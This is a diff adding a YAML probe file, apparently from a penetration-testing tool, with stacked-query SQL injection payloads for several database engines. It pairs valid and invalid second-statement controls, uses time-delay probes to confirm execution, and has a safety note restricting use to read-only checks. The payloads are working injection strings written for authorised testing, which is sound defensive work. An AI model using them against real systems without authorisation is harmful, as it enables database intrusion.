@@ -1,0 +1,58 @@
+# Stacked statements. Every entry stops at proving that a second statement was
+# parsed and executed. None of them writes, alters, or deletes anything.
+#
+# The pattern throughout is a matched pair: a valid second statement and a
+# deliberately invalid one. A response that is merely unchanged proves nothing --
+# a driver that silently discards the remainder looks identical to success.
+id: sqli/stacked
+reviewed: "2026-08-23"   # not re-verified since; treat as unreviewed, not current
+title: Stacked query execution probes
+variables: [DELAY]
+credits:
+  - "Stacked-statement behaviour differences follow vendor driver documentation; entries are written for this project."
+safety: >
+  This is the boundary where a read-only finding becomes a write primitive. Prove
+  execution with an observable read-only effect and stop. Sending INSERT, UPDATE,
+  DELETE, DROP, or any schema change, and using a tool's operating-system or
+  file-write modes, requires explicit written authorisation naming that action.
+entries:
+  - name: parse control -- valid second statement
+    dbms: [mysql, postgresql, mssql, sqlite]
+    payload: "'; SELECT 1--"
+    detect: "Pair with the invalid control below. Interpret only the difference between the two."
+
+  - name: parse control -- invalid second statement
+    dbms: [mysql, postgresql, mssql, sqlite]
+    payload: "'; SELECT FROM WHERE--"
+    detect: "An error here, with none for the valid form, proves the second statement was parsed rather than discarded."
+
+  - name: parse control -- valid second statement (Oracle)
+    dbms: [oracle]
+    payload: "'; SELECT 1 FROM dual--"
+    detect: "Oracle's standard call interface does not accept stacked statements; a uniform response across both controls is the expected result."
+    note: "Record the negative as a driver property. It is a result, not a skipped test."
+
+  - name: parse control -- invalid second statement (Oracle)
+    dbms: [oracle]
+    payload: "'; SELECT FROM WHERE--"
+    detect: "Paired control for the Oracle case above."
+
+  - name: observable effect via delay
+    dbms: [mssql]
+    payload: "'; WAITFOR DELAY '0:0:{{DELAY}}'--"
+    detect: "A delay of roughly {{DELAY}} seconds proves the second statement executed, not merely parsed."
+
+  - name: observable effect via delay
+    dbms: [postgresql]
+    payload: "'; SELECT pg_sleep({{DELAY}})--"
+    detect: "A delay proves execution. PostgreSQL accepts stacked statements over most drivers."
+
+  - name: observable effect via delay
+    dbms: [mysql]
+    payload: "'; SELECT SLEEP({{DELAY}})--"
+    detect: "A delay proves execution, but most MySQL drivers reject multiple statements unless explicitly configured."
+    note: "A negative here is usually the driver's configuration rather than the engine's capability. Record which."
+
+  - name: terminator handling probe
+    payload: "';--"
+    detect: "A bare terminator followed by a comment. If the response is unchanged, the remainder may have been discarded rather than executed -- always corroborate with the paired parse controls."
